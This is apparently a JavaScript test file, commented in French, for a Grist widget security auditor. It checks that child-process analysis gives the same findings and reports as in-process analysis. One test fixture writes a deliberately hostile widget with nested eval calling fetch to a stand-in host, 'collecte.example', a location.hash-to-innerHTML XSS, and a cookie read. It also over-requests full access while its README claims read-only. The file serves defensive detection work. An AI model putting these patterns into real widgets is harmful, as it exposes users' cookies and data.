/**
 * L'analyse dans un enfant ne change rien à ce qu'un audit qui aboutit rend : mêmes constats que dans le
 * processus (à l'identifiant près, que porte un compteur), et des rapports identiques, au caractère près, que
 * l'on rende le contexte entier ou le résumé qui en sort (src/contexte/resume.js). Un champ que les rapports
 * ou l'axe D lisent et que le résumé oublierait fait échouer ces essais, jamais l'audit d'un widget réel.
 *
 * Widgets : la fixture, un mini-widget, et un widget qui exécute du code depuis une chaîne (eval imbriqués :
 * fichiers synthétiques que SARIF remonte jusqu'au fichier réel) avec un README qui annonce l'accès demandé.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { construireContexte } from '../src/contexte/inventaire.js';
import { contexteDepuisResume, resumerContexte } from '../src/contexte/resume.js';
import { analyserEnEnfant } from '../src/isolement/analyse-isolee.js';
import { analyseStatique } from '../src/moteur/statique.js';
import { noter } from '../src/moteur/notation.js';
import { genererHtml } from '../src/rapport/html.js';
import { genererJson } from '../src/rapport/json.js';
import { genererMarkdown } from '../src/rapport/markdown.js';
import { genererSarif } from '../src/rapport/sarif.js';

const RACINE = path.resolve(import.meta.dirname, '..');
const sansUid = (constats) => constats.map(({ uid, ...c }) => c);
const sansDate = (rapport) => rapport.replace(/"genereLe": "[^"]+"/, '"genereLe": "(date)"');

function widgetEvalImbrique(t) {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'gwaudit-test-equiv-'));
  t.after(() => fs.rmSync(d, { recursive: true, force: true }));
  fs.writeFileSync(path.join(d, 'index.html'), '<!doctype html><html><head><meta charset="utf-8"><title>t</title><script src="https://docs.getgrist.com/grist-plugin-api.js"></script></head><body><script src="app.js"></script></body></html>\n');
  fs.writeFileSync(path.join(d, 'app.js'), [
    'grist.ready({ requiredAccess: "full" });',
    'eval("document.body.innerHTML = location.hash; eval(\'fetch(\\"https://collecte.example/x\\")\')");',
    'setTimeout("document.title = document.cookie", 10);',
    '',
  ].join('\n'));
  fs.writeFileSync(path.join(d, 'README.md'), '# Widget de test\n\nAccès demandé : lecture de la table.\n');
  return d;
}

const CIBLES = [
  ['fixtures/widget-exemple', () => path.join(RACINE, 'fixtures', 'widget-exemple')],
  ['tests/fixtures/mini-widget', () => path.join(RACINE, 'tests', 'fixtures', 'mini-widget')],
  ['un widget qui exécute du code depuis une chaîne', widgetEvalImbrique],
];

for (const [nom, cible] of CIBLES) {
  test(`${nom} : mêmes constats et mêmes rapports dans l'enfant et dans le processus`, { timeout: 180_000 }, async (t) => {
    const racine = typeof cible === 'function' ? cible(t) : cible;
    const ctx = construireContexte(racine);
    const constats = await analyseStatique(ctx, { reseau: false });
    const enfant = await analyserEnEnfant({ racine, reseau: false, limites: { limiteMo: null, pileMo: null, delaiMs: null }, relayerStderr: null });

    assert.equal(enfant.ok, true);
    assert.equal(enfant.interruption, null);
    assert.deepEqual(sansUid(enfant.constats), sansUid(constats), 'les constats de l\'enfant sont ceux du processus');
    assert.ok(constats.length > 0, 'la cible produit des constats : la comparaison porte sur quelque chose');

    const resume = contexteDepuisResume(resumerContexte(ctx));
    assert.deepEqual(enfant.ctx, resume, 'le contexte rendu par l\'enfant est le résumé du contexte du processus');

    const notation = noter(constats, new Set(['D']));
    const meta = { version: 'test', nomDepot: 'depot', commit: null, cible: null, tronque: ctx.tronque };
    const formats = { markdown: genererMarkdown, json: genererJson, html: genererHtml, sarif: genererSarif };
    for (const [format, generer] of Object.entries(formats)) {
      assert.equal(sansDate(generer({ ctx: enfant.ctx, notation, meta })), sansDate(generer({ ctx, notation, meta })), `rapport ${format} : le résumé ne change pas une ligne`);
    }
  });
}

test('le widget aux eval imbriqués a bien des fichiers synthétiques dans le contexte (la comparaison SARIF porte sur une chaîne réelle)', async (t) => {
  const ctx = construireContexte(widgetEvalImbrique(t));
  await analyseStatique(ctx, { reseau: false }); // c'est l'axe C qui matérialise le code exécuté depuis une chaîne
  assert.ok(ctx.fichiers.some((f) => f.litteralImbrique && f.origineReelle), 'aucun fichier synthétique : le test ne prouverait rien de SARIF');
  const resume = resumerContexte(ctx);
  assert.ok(resume.fichiers.some((f) => f.litteralImbrique && f.origineReelle));
  assert.ok(resume.fichiers.some((f) => f.chemin === 'README.md' && typeof f.contenu === 'string'), 'le README à la racine garde son contenu (D-PERIMETRE-01)');
});
